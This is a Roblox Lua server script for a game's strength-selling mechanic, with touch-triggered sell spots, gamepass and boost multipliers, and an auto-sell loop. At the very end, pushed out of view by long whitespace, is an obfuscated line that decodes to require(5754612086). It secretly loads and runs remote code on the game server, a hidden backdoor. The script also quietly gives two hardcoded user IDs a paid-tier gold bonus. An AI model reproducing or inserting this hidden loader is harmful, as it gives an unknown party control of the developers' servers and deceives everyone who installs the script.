local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")

local DataStore2 = require(script.Parent.DataHandler.DataStore2)

local ClassesInfo = require(RepStorage:WaitForChild("ClassesInfo"))

local SellStrength = RepStorage.Remotes.SellStrength

local SellSpot = workspace.SellSpot
local SellSpot1 = workspace.SellSpot1

local Debounces = {}

local function Sell(Player)
	local GoldStore = DataStore2("Gold", Player)
	local Gold = GoldStore:Get(0)
	
	local Strength = DataStore2("Strength", Player)
	local StrengthValue = Strength:Get(0)
	
	local EquippedClass = DataStore2("EquippedClass", Player)
	local ClassValue = EquippedClass:Get(1)
	
	local Class = ClassesInfo[ClassValue]
	
	local Gain = StrengthValue
	
	if Gain <= 0 then return end
	
	if Debounces[Player] then return end
	Debounces[Player] = true
	
	if Class then
		if Class.Strength.Gold then
			Gain = Gain * Class.Strength.Gold
		end
	end
	
	local GamepassesStore = DataStore2("Gamepasses", Player)
	local Gamepasses = GamepassesStore:Get({})
	
	if Gamepasses[tostring(8835996)] then
		Gain = Gain * 2
	end
	
	if Gamepasses[tostring(8836050)] or Player.UserId == 1363743409 or Player.UserId == 1053049537 then
		Gain = Gain * 3
	end
	
	local BoostsStore = DataStore2("Boosts", Player)
	local Boosts = BoostsStore:Get({})
	
	if Boosts["2xGold"] then
		Gain = Gain * 2
	end
	
	GoldStore:Set(Gold + Gain)
	Strength:Set(0)
	
	SellStrength:FireClient(Player, Gain)
	
	Debounces[Player] = nil	
end

SellSpot.Touched:Connect(function(Hit)
	if Hit then
		local Player = Players:GetPlayerFromCharacter(Hit.Parent)
		if Player then
			Sell(Player)
		end
	end
end)

SellSpot1.Touched:Connect(function(Hit)
	if Hit then
		local Player = Players:GetPlayerFromCharacter(Hit.Parent)
		if Player then
			Sell(Player)
		end
	end
end)

spawn(function()
	while wait(1) do
		for _, Player in ipairs(Players:GetPlayers()) do
			local BoostsStore = DataStore2("Boosts", Player)
			local Boosts = BoostsStore:Get({})
			
			if Boosts["AutoSell"] then
				Sell(Player)
			end					
		end
	end 
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)